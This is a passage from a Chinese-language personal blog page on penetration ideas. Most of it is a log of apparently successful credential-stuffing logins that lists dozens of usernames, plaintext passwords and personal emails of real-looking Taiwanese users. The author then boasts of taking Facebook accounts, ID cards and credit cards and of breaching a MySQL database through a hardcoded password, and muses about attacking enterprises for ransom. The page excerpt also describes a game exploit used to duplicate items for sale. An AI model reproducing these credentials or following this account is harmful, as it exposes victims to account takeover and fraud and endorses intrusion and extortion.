+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: yx0974043504, Password: a0974043504, Status Code: 200 a0974043504@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0979042990, Password: a0979042990, Status Code: 200 jess518313@yahoo.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0963566296, Password: a0963566296, Status Code: 200 a0963566296@yahoo.com.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0928452731, Password: a0928452731, Status Code: 200 a0928452731@gmail.com st2630322@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0975285779, Password: a0975285779, Status Code: 200 a0975297472@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0911202824, Password: a0911202824, Status Code: 200 
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0989569855, Password: a0989569855, Status Code: 200 -acps91152@gmail.com  -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0912660626, Password: a0912660626, Status Code: 200 -a060943@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0909070825, Password: a0909070825, Status Code: 200 a0909070825@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0936780533, Password: a0936780533, Status Code: 200
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0979580968, Password: a0979580968, Status Code: 200 b0979580968@gmail.com  -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0902101002, Password: a0902101002, Status Code: 200 aa0902101002@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0985430586, Password: a0985430586, Status Code: 200 a0985430586@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0906730857, Password: a0906730857, Status Code: 200 
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0963756676, Password: a0963756676, Status Code: 200 a0963756676@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: q0981388805, Password: a0981388805, Status Code: 200 weileyhu0813@yahoo.com.tw -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: w0908450298, Password: a0908450298, Status Code: 200 rex930504@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: r0980018123, Password: a0980018123, Status Code: 200   -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: sa0981232712, Password: a0981232712, Status Code: 200 sa0981232712@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: q0903738680, Password: a0903738680-, Status Code: 200 a0903738680@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0973886245, Password: a0973886245, Status Code: 200 s0973886245@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0900413183, Password: a0900413183, Status Code: 200 dog970dog@yahoo.com.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0921781869, Password: a0921781869, Status Code: 200 sxiao6071@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: q0970788600, Password: a0970788600, Status Code: 200 aaa0970788600@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0903828673, Password: a0903828673, Status Code: 200 C107113210@nkust.edu.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: t0972811154, Password: a0972811154, Status Code: 200 t0972811154@gmail.com -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0986199269, Password: a0986199269, Status Code: 200 doublew0423@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0970566527, Password: a0970566527, Status Code: 200 hunhun168168268@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0988257795, Password: a0988257795, Status Code: 200 a0988257795@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0939282769, Password: a0939282769, Status Code: 200 axz123123@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0952070619, Password: a0952070619, Status Code: 200 a0952070619@gmail.com   -
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0970763930, Password: a0970763930, Status Code: 200 a0970763930@icloud.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0905180925, Password: a0905180925, Status Code: 200 a0905180925@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: c0906522264, Password: a0906522264, Status Code: 200 a0906522264@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0932729141, Password: a0932729141, Status Code: 200 a0932729141@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z0920212123, Password: a0920212123, Status Code: 200 sp40384579@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0925093877, Password: a0925093877, Status Code: 200 a0925093877@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: lj0965137654, Password: a0965137654, Status Code: 200 melody19991018@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: bo0906364202, Password: a0906364202, Status Code: 200 continue88@yahoo.com.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0979767832, Password: a0979767832, Status Code: 200 a080888888@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0979619251, Password: a0979619251, Status Code: 200 aa0979619251@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0972808320, Password: a0972808320, Status Code: 200 a0972808320@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: as0986307029, Password: a0986307029, Status Code: 200 as0986307029@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: ab0976744597, Password: a0976744597, Status Code: 200 a0976744597@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: b0907746473, Password: a0907746473, Status Code: 200 a0907746473@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: z09781279, Password: a09781279, Status Code: 200 xx192922@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: j0978099261, Password: a0978099261, Status Code: 200 smile0978099265@yahoo.com.tw
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0939015430, Password: a0939015430, Status Code: 200 a0939015430@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: s0965005858, Password: a0965005858, Status Code: 200 a0965005858@gmail.com
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+Username: aa0905664221, Password: a0905664221, Status Code: 200
+Response: &#123;&quot;data&quot;:&#123;&quot;status&quot;:1&#125;&#125;
+</code></pre>
+<p>但是!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p>
+<p>打下帳號頂多獲得facebook，身分證.信用卡等等，我確實拿到了信用卡好幾張2張過期 3張未過期，但是他們共同點，無法使用。</p>
+<p>也沒有勒索功能。純屬自嗨!?</p>
+<p>滲透mysql庫呢，去年我打下了一個mysql庫，他被滲透原因，把mysql庫的密碼，寫在客戶端，被我逆向取出。</p>
+<p>也沒有勒索價值，mysql庫權限十分嚴格，我無法提權到系統root 只有mysql的root。</p>
+<p>或許我應該去打企業或是更高價值的地方。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/600211.webp" data-sizes="auto" alt="Rust基礎" class="lazyload">
+          
+        
+        <a href="/2025/06/02/Rust%E5%9F%BA%E7%A4%8E/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            Rust基礎
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/600211.webp" data-sizes="auto" alt="nvm基礎" class="lazyload">
+        
+      
+      <a href="/2025/06/01/nvm%E5%9F%BA%E7%A4%8E/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          nvm基礎
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      一袋米要扛幾樓
+    </div>
+    
+      <div>
+        基於&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        9.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:01
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">總訪問量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">總訪客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目錄</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/600211.webp" data-sizes="auto" alt="一袋米要扛幾樓" class="lazyload">
+  <div class="sidebar-author-name">一袋米要扛幾樓</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分類</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>標籤</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首頁"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首頁</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="歸檔"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">歸檔</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="關於"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">關於</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友鏈"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友鏈</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "一袋米要扛幾樓",
+          title: "未來滲透思路",
+          url: "https://itamiokanjiro.ddns.net:3111/2025/06/01/%E6%9C%AA%E4%BE%86%E6%BB%B2%E9%80%8F%E6%80%9D%E8%B7%AF/",
+          excerpt: "",
+          description: "",
+          stripContent: "現今的滲透已經AI化了各種腳本  打下網站   大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫除非工程師程式邏輯有問題 就像是如今全球服精靈樂章 的 API 整數溢出  在內存中 輸入(65536 &amp;#x2F; 2 -1) 就能觸發 幻想神域 台服的轉帳系統異常一樣 都可以構成無限複製虛寶，販賣給玩家是有錢賺的。 某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站的防禦功能失效。 台灣論壇巴哈姆特的防腳本Captcha存在漏洞，實際上不用點擊圖片就能無限制瘋狂登",
+          date: "Sun Jun 01 2025 20:01:12 GMT+0800",
+          updated: "Sun Jun 01 2025 20:34:21 GMT+0800",
+          cover: "/images/600211.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.4' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
